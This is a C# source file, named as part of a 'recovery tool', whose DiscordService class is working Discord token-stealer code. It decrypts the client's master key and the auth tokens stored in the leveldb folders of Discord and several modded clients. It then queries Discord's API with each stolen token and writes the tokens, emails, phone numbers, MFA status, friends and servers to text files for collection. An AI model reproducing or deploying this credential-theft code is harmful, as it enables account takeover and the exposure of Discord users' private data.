using System.Security.Cryptography;
using System.Text.Json.Serialization;
using System.Text.Json;
using System.Text.RegularExpressions;
using System.Text;
using RecoveryTool.Recovery.Utilities;

namespace RecoveryTool.Recovery.Messenger
{
    public class UserData
    {
        [JsonPropertyName("id")]
        public string Id { get; set; }

        [JsonPropertyName("username")]
        public string Username { get; set; }

        [JsonPropertyName("global_name")]
        public string GlobalName { get; set; }

        [JsonPropertyName("clan")]
        public string Clan { get; set; }

        [JsonPropertyName("mfa_enabled")]
        public bool MfaEnabled { get; set; }

        [JsonPropertyName("locale")]
        public string Locale { get; set; }

        [JsonPropertyName("email")]
        public string Email { get; set; }

        [JsonPropertyName("verified")]
        public bool Verified { get; set; }

        [JsonPropertyName("phone")]
        public string Phone { get; set; }

        [JsonPropertyName("bio")]
        public string Bio { get; set; }
    }

    public class Relationship
    {
        [JsonPropertyName("type")]
        public int Type { get; set; }

        [JsonPropertyName("user")]
        public RelationshipUser User { get; set; }
    }

    public class RelationshipUser
    {
        [JsonPropertyName("id")]
        public string Id { get; set; }

        [JsonPropertyName("username")]
        public string Username { get; set; }

        [JsonPropertyName("discriminator")]
        public string Discriminator { get; set; }
    }

    public class Guild
    {
        [JsonPropertyName("id")]
        public string Id { get; set; }

        [JsonPropertyName("name")]
        public string Name { get; set; }

        [JsonPropertyName("owner")]
        public bool Owner { get; set; }

        [JsonPropertyName("features")]
        public List<string> Features { get; set; }

        [JsonPropertyName("permissions")]
        public string Permissions { get; set; }

        public bool IsDiscoverable => Features?.Contains("DISCOVERABLE") ?? false;
        public bool HasVanityUrl => Features?.Contains("VANITY_URL") ?? false;
    }

    public class DiscordService
    {
        private static readonly string ScriptPath = AppDomain.CurrentDomain.BaseDirectory;
        private static readonly HttpClient HttpClientInstance = new HttpClient
        {
            Timeout = TimeSpan.FromSeconds(10)
        };

        public static async Task SaveDiscordAsync()
        {
            await GetTokenAsync();
        }

        private static string Decrypt(byte[] buffer, byte[] masterKey)
        {
            try
            {
                byte[] key = ProtectedData.Unprotect(masterKey, null, DataProtectionScope.CurrentUser);
                using var aes = new AesGcm(key);
                byte[] nonce = buffer.Skip(3).Take(12).ToArray();
                byte[] ciphertext = buffer.Skip(15).Take(buffer.Length - 15 - 16).ToArray();
                byte[] tag = buffer.Skip(buffer.Length - 16).Take(16).ToArray();
                byte[] plaintext = new byte[ciphertext.Length];

                aes.Decrypt(nonce, ciphertext, tag, plaintext);
                string decrypted = Encoding.UTF8.GetString(plaintext);
                return decrypted;
            } catch { return null; }
        }

        private static async Task GetTokenAsync()
        {
            var paths = new Dictionary<string, string>
            {
                {"Discord", Path.Combine(Common.AppData, "discord")},
                {"Discord Canary", Path.Combine(Common.AppData, "discordcanary")},
                {"Lightcord", Path.Combine(Common.AppData, "Lightcord")},
                {"Discord PTB", Path.Combine(Common.AppData, "discordptb")},
                {"BetterDiscord", Path.Combine(Common.AppData, "BetterDiscord")},
                {"Powercord", Path.Combine(Common.AppData, "Powercord")},
                {"Replugged", Path.Combine(Common.AppData, "replugged")}
            };

            var printedTokens = new HashSet<string>();
            var userDataBuilder = new StringBuilder();
            var friendsBuilder = new StringBuilder();
            var blockedFriendsBuilder = new StringBuilder();
            var ownedServersBuilder = new StringBuilder();
            var otherServersBuilder = new StringBuilder();

            friendsBuilder.AppendLine("Friends:");
            friendsBuilder.AppendLine(new string('=', 20));
            friendsBuilder.AppendLine();

            blockedFriendsBuilder.AppendLine("Blocked Friends:");
            blockedFriendsBuilder.AppendLine(new string('=', 20));
            blockedFriendsBuilder.AppendLine();

            ownedServersBuilder.AppendLine("Owned Servers:");
            ownedServersBuilder.AppendLine(new string('=', 20));
            ownedServersBuilder.AppendLine();

            otherServersBuilder.AppendLine("Other Servers:");
            otherServersBuilder.AppendLine(new string('=', 20));
            otherServersBuilder.AppendLine();

            foreach (var path in paths.Values)
            {
                if (!Directory.Exists(path)) { continue; }

                string localStatePath = Path.Combine(path, "Local State");
                if (!File.Exists(localStatePath)) { continue; }

                string key;
                try
                {
                    string json = File.ReadAllText(localStatePath);
                    var data = JsonSerializer.Deserialize<JsonElement>(json);
                    key = data.GetProperty("os_crypt").GetProperty("encrypted_key").GetString();
                } catch { continue; }

                string levelDbPath = Path.Combine(path, "Local Storage", "leveldb");
                if (!Directory.Exists(levelDbPath)) { continue; }

                var tokens = new List<string>();

                foreach (string file in Directory.GetFiles(levelDbPath, "*.ldb"))
                {
                    try
                    {
                        string[] lines = File.ReadAllLines(file);
                        foreach (string line in lines)
                        {
                            foreach (Match match in Regex.Matches(line, "dQw4w9WgXcQ:[^\"]*"))
                            {
                                tokens.Add(match.Value);
                            }
                        }
                    } catch { continue; }
                }

                foreach (string token in tokens)
                {
                    try
                    {
                        string[] parts = token.Split(':', 2);
                        if (parts.Length < 2) { continue; }

                        byte[] encryptedData = Convert.FromBase64String(parts[1]);
                        byte[] masterKey = Convert.FromBase64String(key).Skip(5).ToArray();

                        string decryptedToken = Decrypt(encryptedData, masterKey);
                        if (string.IsNullOrEmpty(decryptedToken)) { continue; }
                        if (printedTokens.Contains(decryptedToken)) { continue; }
                        printedTokens.Add(decryptedToken);

                        HttpClientInstance.DefaultRequestHeaders.Clear();
                        HttpClientInstance.DefaultRequestHeaders.Add("Authorization", decryptedToken);
                        HttpClientInstance.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64)");

                        HttpResponseMessage userResponse = await HttpClientInstance.GetAsync("https://discord.com/api/v10/users/@me");
                        if (userResponse.IsSuccessStatusCode)
                        {
                            string userDataJson = await userResponse.Content.ReadAsStringAsync();
                            var user = JsonSerializer.Deserialize<UserData>(userDataJson);

                            if (user != null)
                            {
                                string formattedData = $"Display Name: {user.GlobalName}\n" +
                                                       $"Username: {user.Username} ({user.Id})\n" +
                                                       $"Email: {user.Email}\n" +
                                                       $"Phone: {user.Phone}\n" +
                                                       $"Token: {decryptedToken}\n" +
                                                       $"Clan: {user.Clan ?? "None"}\n" +
                                                       $"MFA Enabled: {user.MfaEnabled}\n" +
                                                       $"Verified: {user.Verified}\n" +
                                                       $"Locale: {user.Locale}\n" +
                                                       $"Bio:\n{user.Bio}\n\n";
                                userDataBuilder.AppendLine(formattedData);
                            }
                        }

                        HttpResponseMessage friendsResponse = await HttpClientInstance.GetAsync("https://discord.com/api/v10/users/@me/relationships");

                        if (friendsResponse.IsSuccessStatusCode)
                        {
                            string friendsJson = await friendsResponse.Content.ReadAsStringAsync();
                            var relationships = JsonSerializer.Deserialize<List<Relationship>>(friendsJson);

                            if (relationships != null && relationships.Count > 0)
                            {
                                foreach (var relationship in relationships)
                                {
                                    if (relationship.User == null) { continue; }

                                    string friendInfo = $"{relationship.User.Username}#{relationship.User.Discriminator}";

                                    if (relationship.Type == 1)
                                    {
                                        friendsBuilder.AppendLine(friendInfo);
                                    }
                                    else if (relationship.Type == 2)
                                    {
                                        blockedFriendsBuilder.AppendLine(friendInfo);
                                    }
                                }
                                friendsBuilder.AppendLine();
                                blockedFriendsBuilder.AppendLine();
                            }
                        }

                        HttpResponseMessage guildsResponse = await HttpClientInstance.GetAsync("https://discord.com/api/v10/users/@me/guilds");

                        if (guildsResponse.IsSuccessStatusCode)
                        {
                            string guildsJson = await guildsResponse.Content.ReadAsStringAsync();
                            var guilds = JsonSerializer.Deserialize<List<Guild>>(guildsJson);

                            if (guilds != null && guilds.Count > 0)
                            {
                                foreach (var guild in guilds)
                                {
                                    string guildInfo = $"Name: {guild.Name} ({guild.Id})\nPermissions: {guild.Permissions}\nDiscoverable: {guild.IsDiscoverable}\nCustom Link: {guild.HasVanityUrl}\n";

                                    if (guild.Owner)
                                    {
                                        ownedServersBuilder.AppendLine(guildInfo);
                                        ownedServersBuilder.AppendLine();
                                    }
                                    else
                                    {
                                        otherServersBuilder.AppendLine(guildInfo);
                                        otherServersBuilder.AppendLine();
                                    }
                                }
                            }
                        }
                    } catch { continue; }
                }
            }

            var combinedFriendsBuilder = new StringBuilder();
            combinedFriendsBuilder.Append(friendsBuilder);
            combinedFriendsBuilder.Append(blockedFriendsBuilder);

            var combinedServersBuilder = new StringBuilder();
            combinedServersBuilder.Append(ownedServersBuilder);
            combinedServersBuilder.Append(otherServersBuilder);

            string discordPath = Common.EnsureDiscordPath();
            File.WriteAllText(Path.Combine(discordPath, "Basic.txt"), userDataBuilder.ToString(), Encoding.UTF8);
            File.WriteAllText(Path.Combine(discordPath, "Relations.txt"), combinedFriendsBuilder.ToString(), Encoding.UTF8);
            File.WriteAllText(Path.Combine(discordPath, "Servers.txt"), combinedServersBuilder.ToString(), Encoding.UTF8);
        }
    }
}